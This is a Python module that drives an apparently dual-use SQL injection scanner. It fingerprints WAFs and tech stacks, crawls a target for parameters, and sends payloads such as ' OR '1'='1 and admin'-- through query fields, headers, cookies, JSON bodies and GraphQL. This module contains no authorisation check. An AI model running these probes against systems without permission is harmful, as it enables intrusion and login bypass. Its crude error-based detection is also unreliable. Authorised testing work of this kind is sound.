"""
Assessment Engine Module
========================

Main orchestration engine for the SQL injection assessment framework.
Coordinates all components: crawler, detection, injection, and reporting.
"""

import asyncio
from typing import Optional, Dict, Any, List
from dataclasses import dataclass, field
from datetime import datetime
from urllib.parse import urlparse

from .http_engine import AsyncHTTPEngine, RequestConfig
from ..crawler import SmartCrawler, CrawlResult, FormParameter
from ..detection import DetectionEngine, DetectionResult
from ..payloads import PayloadEngine, PayloadSet
from ..analyzer import ResultAnalyzer
from ..waf import WAFDetector
from ..utils import setup_logging, SafetyControls, TrackedLogger


logger = setup_logging()


@dataclass
class AssessmentConfig:
    """Configuration for the assessment engine."""
    target: str
    depth: int = 2
    concurrency: int = 10
    timeout: float = 30.0
    proxy: Optional[str] = None
    cookies: Optional[Dict[str, str]] = None
    headers: Optional[Dict[str, str]] = None
    auth: Optional[tuple] = None
    verbosity: int = 0
    output: Optional[str] = None
    save_session: Optional[str] = None
    load_session: Optional[str] = None
    max_payloads: int = 150
    delay_between_tests: float = 0.5
    follow_redirects: bool = True
    verify_ssl: bool = True
    custom_payloads: Optional[List[str]] = None


@dataclass
class VulnerabilityFinding:
    """Represents a detected vulnerability."""
    endpoint: str
    parameter: str
    method: str
    injection_type: str
    payload: str
    confidence: float
    severity: str
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.now)


@dataclass
class AssessmentResult:
    """Result of the assessment."""
    target: str
    scan_start: datetime
    scan_end: Optional[datetime] = None
    endpoints_tested: int = 0
    parameters_tested: int = 0
    vulnerabilities_found: List[VulnerabilityFinding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)
    
    @property
    def total_vulnerabilities(self) -> int:
        return len(self.vulnerabilities_found)
    
    @property
    def duration_seconds(self) -> float:
        if self.scan_end:
            return (self.scan_end - self.scan_start).total_seconds()
        return 0.0


class AssessmentEngine:
    """
    Main assessment engine that orchestrates all components.
    
    Coordinates:
    - Smart Crawler for endpoint discovery
    - Payload Engine for test generation
    - Injection Engine for parameter testing
    - Detection Engine for vulnerability identification
    - Analyzer for result correlation
    - WAF Detector for adaptive testing
    """
    
    def __init__(self, **config):
        self.config = AssessmentConfig(**config)
        self._http_engine: Optional[AsyncHTTPEngine] = None
        self._crawler: Optional[SmartCrawler] = None
        self._payload_engine: Optional[PayloadEngine] = None
        self._detection_engine: Optional[DetectionEngine] = None
        self._analyzer: Optional[ResultAnalyzer] = None
        self._waf_detector: Optional[WAFDetector] = None
        self._tracked_logger = TrackedLogger()
        self._result = AssessmentResult(
            target=self.config.target,
            scan_start=datetime.now()
        )
    
    async def _init_components(self) -> None:
        """Initialize all components."""
        self._payload_engine = PayloadEngine(
            max_payloads=self.config.max_payloads,
        )
        
        if self.config.custom_payloads:
            self._payload_engine.set_custom_payloads(self.config.custom_payloads)
            logger.info(f"Loaded {len(self.config.custom_payloads)} custom payloads")
        
        self._detection_engine = DetectionEngine(
            verbosity=self.config.verbosity,
        )
        
        self._analyzer = ResultAnalyzer()
        
        self._waf_detector = WAFDetector()
    
    async def _analyze_target(self) -> None:
        """Analyze target for WAF, CDN, and tech stack."""
        import httpx
        from bs4 import BeautifulSoup
        
        try:
            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                r = await client.get(self.config.target)
                
                headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
                body_lower = r.text.lower()
                
                waf_detected = False
                waf_name = "Unknown"
                
                waf_signatures = {
                    'cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
                    'akamai': ['akamai', 'akamaized'],
                    'aws_waf': ['aws-waf', 'amzn'],
                    'imperva': ['incapsula', 'x-cdn'],
                    'fortiweb': ['fortiweb', 'fortigate'],
                    'modsecurity': ['mod_security', 'modsecurity'],
                    'sucuri': ['sucuri', 'x-sucuri'],
                }
                
                for name, sigs in waf_signatures.items():
                    if any(s in headers_lower or s in body_lower for s in sigs):
                        waf_detected = True
                        waf_name = name.upper()
                        break
                
                cdn_detected = False
                cdn_name = "Unknown"
                
                cdn_signatures = {
                    'cloudfront': ['cloudfront'],
                    'fastly': ['fastly'],
                    'cdnjs': ['cdnjs'],
                    'jsdelivr': ['jsdelivr'],
                }
                
                for name, sigs in cdn_signatures.items():
                    if any(s in body_lower for s in sigs):
                        cdn_detected = True
                        cdn_name = name.upper()
                        break
                
                soup = BeautifulSoup(r.text, 'html.parser')
                tech_stack = []
                
                tech_signatures = {
                    'react': ['react', 'react-dom'],
                    'vue': ['vue.js', 'vuejs'],
                    'angular': ['angular', 'ng-version'],
                    'nodejs': ['node', 'express'],
                    'python': ['django', 'flask', 'python'],
                    'php': ['php', 'laravel', 'wordpress'],
                    'java': ['jsp', 'tomcat', 'spring'],
                    'apache': ['apache'],
                    'nginx': ['nginx'],
                }
                
                script_text = r.text.lower()
                for tech, sigs in tech_signatures.items():
                    if any(s in script_text for s in sigs):
                        tech_stack.append(tech)
                
                print(f"  WAF Detected:  {'YES - ' + waf_name if waf_detected else 'NO'}")
                print(f"  CDN Detected:  {'YES - ' + cdn_name if cdn_detected else 'NO'}")
                print(f"  Tech Stack:    {', '.join(tech_stack) if tech_stack else 'Unknown'}")
                print(f"  Server:        {r.headers.get('server', 'Unknown')}")
                print()
                
        except Exception as e:
            print(f"  Analysis error: {e}")
            print()
    
    async def _crawl_target(self) -> List[CrawlResult]:
        """Crawl target to discover endpoints and parameters - Enhanced for modern websites."""
        logger.info(f"Starting crawl of {self.config.target} (depth: {self.config.depth})")
        
        try:
            import httpx
            from bs4 import BeautifulSoup
            from urllib.parse import urlparse, parse_qs, urljoin
            
            url = self.config.target
            results = []
            
            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                r = await client.get(url)
                
                if r.status_code == 200:
                    content_type = r.headers.get('content-type', '')
                    is_html = 'text/html' in content_type
                    
                    if is_html:
                        soup = BeautifulSoup(r.text, 'html.parser')
                        
                        parsed = urlparse(url)
                        params = []
                        
                        for name, vals in parse_qs(parsed.query).items():
                            params.append(FormParameter(name=name, value=vals[0], param_type='query'))
                        
                        form_method = 'GET'
                        for form in soup.find_all('form'):
                            method = form.get('method', 'GET').upper()
                            action = form.get('action', '')
                            inputs = []
                            for inp in form.find_all(['input', 'select', 'textarea']):
                                name = inp.get('name')
                                if name:
                                    inputs.append(FormParameter(
                                        name=name,
                                        value=inp.get('value', ''),
                                        param_type=inp.get('type', 'text')
                                    ))
                            if inputs:
                                full_url = urljoin(url, action) if action else url
                                results.append(CrawlResult(
                                    url=full_url,
                                    method=method,
                                    parameters=inputs,
                                    forms=[]
                                ))
                        
                        for inp in soup.find_all('input'):
                            name = inp.get('name')
                            if name and name not in [p.name for p in params]:
                                params.append(FormParameter(
                                    name=name,
                                    value=inp.get('value', ''),
                                    param_type=inp.get('type', 'text')
                                ))
                        
                        links_found = set()
                        for link in soup.find_all('a', href=True):
                            href = link.get('href', '')
                            if href and '?' in href and 'http' in href:
                                full_url = urljoin(url, href)
                                if full_url not in links_found:
                                    links_found.add(full_url)
                                    parsed_link = urlparse(full_url)
                                    link_params = []
                                    for name, vals in parse_qs(parsed_link.query).items():
                                        link_params.append(FormParameter(name=name, value=vals[0], param_type='query'))
                                    if link_params:
                                        results.append(CrawlResult(
                                            url=full_url,
                                            method='GET',
                                            parameters=link_params,
                                            forms=[]
                                        ))
                        
                        if params:
                            param_names = {p.name for p in params}
                            common_params = ['item', 'RetURL', 'page', 'id', 'search', 'query', 'q', 'keyword']
                            for cp in common_params:
                                if cp not in param_names:
                                    params.append(FormParameter(name=cp, value='', param_type='common'))
                            
                            results.append(CrawlResult(
                                url=url,
                                method='GET',
                                parameters=params,
                                forms=[]
                            ))
                        
                        meta = soup.find_all('meta', attrs={'http-equiv': True})
                        for m in meta:
                            if m.get('http-equiv', '').lower() == 'refresh':
                                content = m.get('content', '')
                                if 'url=' in content.lower():
                                    url_part = content.split('url=')[-1].strip()
                                    if url_part.startswith('http'):
                                        results.append(CrawlResult(
                                            url=url_part,
                                            method='GET',
                                            parameters=[],
                                            forms=[]
                                        ))
                    
                    if '/api/' in url.lower() or 'application/json' in content_type:
                        results.append(CrawlResult(
                            url=url,
                            method='POST',
                            parameters=[FormParameter(name='json_body', value='{}', param_type='json')],
                            forms=[]
                        ))
                    
                    graphql_urls = ['/graphql', '/api/graphql', '/graphiql', '/v1/graphql']
                    for gurl in graphql_urls:
                        if gurl in url.lower():
                            results.append(CrawlResult(
                                url=url,
                                method='POST',
                                parameters=[FormParameter(name='query', value='{__typename}', param_type='graphql')],
                                forms=[]
                            ))
            
            dedup_results = []
            seen_urls = set()
            for r in results:
                if r.url not in seen_urls:
                    seen_urls.add(r.url)
                    dedup_results.append(r)
            
            logger.info(f"Crawl complete. Found {len(dedup_results)} endpoints")
            return dedup_results
        except Exception as e:
            logger.error(f"Crawl failed: {e}")
            self._result.errors.append(f"Crawl error: {str(e)}")
            return []
    
    async def _test_endpoint(
        self,
        crawl_result: CrawlResult,
        baseline: Optional[Dict[str, Any]] = None
    ) -> List[DetectionResult]:
        """Test an endpoint for SQL injection vulnerabilities."""
        results = []
        
        if not crawl_result.parameters and not crawl_result.forms:
            return results
        
        payloads = self._payload_engine.get_all_payloads()
        
        C_HIGH = '\033[91m'
        C_MED = '\033[93m'
        C_LOW = '\033[92m'
        C_RESET = '\033[0m'
        C_BOLD = '\033[1m'
        
        print(f"\n{'='*70}")
        print(f"{C_BOLD}[*] Testing endpoint:{C_RESET} {crawl_result.url}")
        print(f"    Method: {crawl_result.method}, Parameters: {len(crawl_result.parameters)}")
        
        payload_stats = {"high": 0, "medium": 0, "low": 0, "unknown": 0}
        for p in payloads:
            risk = getattr(p, 'risk_level', 'unknown')
            payload_stats[risk if risk in payload_stats else "unknown"] += 1
        
        print(f"    Payloads by severity: [{C_HIGH}HIGH{C_RESET}]={payload_stats['high']}, [{C_MED}MED{C_RESET}]={payload_stats['medium']}, [{C_LOW}LOW{C_RESET}]={payload_stats['low']}")
        print(f"{'='*70}")
        
        total_tests = len(crawl_result.parameters) * len(payloads)
        test_count = 0
        
        for param in crawl_result.parameters:
            self._tracked_logger.add_event('test_param', f'Testing {param.name}')
            
            param_vulns = 0
            param_tests = 0
            
            for payload in payloads:
                try:
                    risk = getattr(payload, 'risk_level', 'medium')
                    payload_value = payload.value if hasattr(payload, 'value') else str(payload)
                    payload_type = getattr(payload, 'payload_type', None)
                    type_name = payload_type.value.upper() if payload_type else 'UNKNOWN'
                    
                    test_count += 1
                    
                    if self.config.verbosity >= 1:
                        sev_color = {"high": C_HIGH, "medium": C_MED, "low": C_LOW}.get(risk, "")
                        severity_marker = {"high": "HIGH", "medium": "MED", "low": "LOW"}.get(risk, "   ")
                        progress = f"[{test_count}/{total_tests}]"
                        print(f"    {progress} [{sev_color}{severity_marker:4}{C_RESET}] [{type_name}] {param.name}: {payload_value[:35]}{'...' if len(payload_value) > 35 else ''}")
                    
                    detection_result = await self._detection_engine.test_parameter(
                        http_engine=self._http_engine,
                        endpoint=crawl_result.url,
                        method=crawl_result.method,
                        parameter=param.name,
                        payload=payload_value,
                        baseline=baseline,
                    )
                    
                    param_tests += 1
                    
                    if detection_result.is_vulnerable:
                        results.append(detection_result)
                        param_vulns += 1
                        
                        self._tracked_logger.add_event(
                            'vuln_found',
                            f"Vulnerability in {param.name}",
                            payload=payload_value,
                            confidence=detection_result.confidence
                        )
                        
                        if self.config.verbosity >= 1:
                            print(f"    {' '*20}{C_BOLD}{C_HIGH}>>> [!] VULNERABLE!{C_RESET} Type: {detection_result.injection_type.value}, Confidence: {detection_result.confidence:.0%}")
                    
                    await asyncio.sleep(self.config.delay_between_tests)
                    
                except Exception as e:
                    logger.debug(f"Payload test error: {e}")
                    continue
            
            if self.config.verbosity >= 1:
                print(f"    {'-'*70}")
                print(f"    {C_BOLD}Parameter '{param.name}' complete:{C_RESET} {param_vulns} vulnerabilities / {param_tests} tests")
        
        await self._test_injection_points(crawl_result, results, baseline)
        
        print(f"\n    {C_BOLD}Endpoint testing complete: {len(results)} vulnerabilities found{C_RESET}")
        return results
    
    async def _test_injection_points(
        self,
        crawl_result: CrawlResult,
        results: List[DetectionResult],
        baseline: Optional[Dict[str, Any]]
    ) -> None:
        """Test additional injection points: headers, cookies, JSON, GraphQL."""
        
        from ..detection import DetectionResult, InjectionType
        
        test_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1'--",
            "' OR 1=1--",
            "admin'--",
        ]
        
        for payload in test_payloads[:2]:
            try:
                headers = {"X-Forwarded-For": payload, "X-Real-IP": f"1.1.1.1'; {payload}"}
                response = await self._http_engine.get(crawl_result.url, headers=headers)
                
                if response.status_code >= 500 or 'sql' in response.text.lower()[:500]:
                    results.append(DetectionResult(
                        endpoint=crawl_result.url,
                        parameter="X-Forwarded-For",
                        method="GET",
                        payload=payload,
                        injection_type=InjectionType.HEADER_INJECTION,
                        is_vulnerable=True,
                        confidence=0.75,
                        evidence={'injection_type': 'header', 'status': response.status_code}
                    ))
            except:
                pass
            
            try:
                cookies = {"session": f"abc'; {payload}", "user": payload}
                response = await self._http_engine.get(crawl_result.url, cookies=cookies)
                
                if response.status_code >= 500 or 'sql' in response.text.lower()[:500]:
                    results.append(DetectionResult(
                        endpoint=crawl_result.url,
                        parameter="Cookie",
                        method="GET",
                        payload=payload,
                        injection_type=InjectionType.COOKIE_INJECTION,
                        is_vulnerable=True,
                        confidence=0.7,
                        evidence={'injection_type': 'cookie', 'status': response.status_code}
                    ))
            except:
                pass
        
        json_payloads = [
            {"id": "1 OR 1=1"},
            {"id": "1' OR '1'='1"},
            {"username": "admin' OR '1'='1", "password": "any"},
            {"query": "test' OR 1=1--"},
        ]
        
        for json_payload in json_payloads[:2]:
            try:
                import json
                response = await self._http_engine.post(
                    crawl_result.url,
                    data=json.dumps(json_payload),
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code >= 500 or 'sql' in response.text.lower()[:500] or 'error' in response.text.lower()[:300]:
                    results.append(DetectionResult(
                        endpoint=crawl_result.url,
                        parameter="JSON_BODY",
                        method="POST",
                        payload=str(json_payload)[:50],
                        injection_type=InjectionType.JSON_API,
                        is_vulnerable=True,
                        confidence=0.7,
                        evidence={'injection_type': 'json', 'status': response.status_code}
                    ))
            except:
                pass
        
        graphql_payloads = [
            {"query": "{user(id:1){name}}"},
            {"query": "query{user(id:1 OR 1=1){name}}"},
            {"query": "mutation{login(user:\"admin\",pass:\"' OR '1'='1\")}"},
        ]
        
        for gql_payload in graphql_payloads[:2]:
            try:
                import json
                response = await self._http_engine.post(
                    crawl_result.url,
                    data=json.dumps(gql_payload),
                    headers={"Content-Type": "application/json"}
                )
                
                if response.status_code >= 500 or 'error' in response.text.lower()[:300]:
                    results.append(DetectionResult(
                        endpoint=crawl_result.url,
                        parameter="GraphQL",
                        method="POST",
                        payload=str(gql_payload)[:50],
                        injection_type=InjectionType.GRAPHQL,
                        is_vulnerable=True,
                        confidence=0.65,
                        evidence={'injection_type': 'graphql', 'status': response.status_code}
                    ))
            except:
                pass
    
    async def _correlate_results(self, detection_results: List[DetectionResult]) -> List[VulnerabilityFinding]:
        """Correlate detection results to reduce false positives."""
        correlated = self._analyzer.correlate_results(detection_results)
        
        findings = []
        for result in correlated:
            finding = VulnerabilityFinding(
                endpoint=result.endpoint,
                parameter=result.parameter,
                method=result.method,
                injection_type=result.injection_type,
                payload=result.payload,
                confidence=result.confidence,
                severity=self._analyzer.assign_severity(result.confidence),
                evidence=result.evidence,
            )
            findings.append(finding)
        
        return findings
    
    async def run(self) -> AssessmentResult:
        """
        Run the full assessment.
        
        Returns:
            AssessmentResult with all findings
        """
        try:
            await self._init_components()
            
            self._http_engine = AsyncHTTPEngine(
                base_url=self.config.target,
                timeout=self.config.timeout,
                proxy=self.config.proxy,
                cookies=self.config.cookies,
                headers=self.config.headers,
                auth=self.config.auth,
            )
            
            print("\n" + "="*60)
            print("[TARGET ANALYSIS]")
            print("="*60)
            
            await self._analyze_target()
            
            crawl_results = await self._crawl_target()
            
            self._result.endpoints_tested = len(crawl_results)
            
            baseline_responses = {}
            
            for crawl_result in crawl_results:
                baseline = await self._detection_engine.establish_baseline(
                    self._http_engine,
                    crawl_result.url,
                    crawl_result.method,
                    crawl_result.parameters
                )
                baseline_responses[crawl_result.url] = baseline
                
                detection_results = await self._test_endpoint(
                    crawl_result,
                    baseline=baseline
                )
                
                self._result.parameters_tested += len(crawl_result.parameters)
                
                if detection_results:
                    findings = await self._correlate_results(detection_results)
                    self._result.vulnerabilities_found.extend(findings)
            
            logger.info(
                f"Assessment complete: {self._result.total_vulnerabilities} "
                f"vulnerabilities found in {self._result.endpoints_tested} endpoints"
            )
        
        except Exception as e:
            logger.error(f"Assessment failed: {e}")
            self._result.errors.append(f"Assessment error: {str(e)}")
        
        finally:
            self._result.scan_end = datetime.now()
        
        return self._result
    
    def get_summary(self) -> Dict[str, Any]:
        """Get summary of the assessment."""
        return {
            'target': self.config.target,
            'endpoints_tested': self._result.endpoints_tested,
            'parameters_tested': self._result.parameters_tested,
            'vulnerabilities': self._result.total_vulnerabilities,
            'duration': self._result.duration_seconds,
            'by_severity': {
                'critical': len([v for v in self._result.vulnerabilities_found if v.severity == 'critical']),
                'high': len([v for v in self._result.vulnerabilities_found if v.severity == 'high']),
                'medium': len([v for v in self._result.vulnerabilities_found if v.severity == 'medium']),
                'low': len([v for v in self._result.vulnerabilities_found if v.severity == 'low']),
            },
            'events': self._tracked_logger.summary(),
        }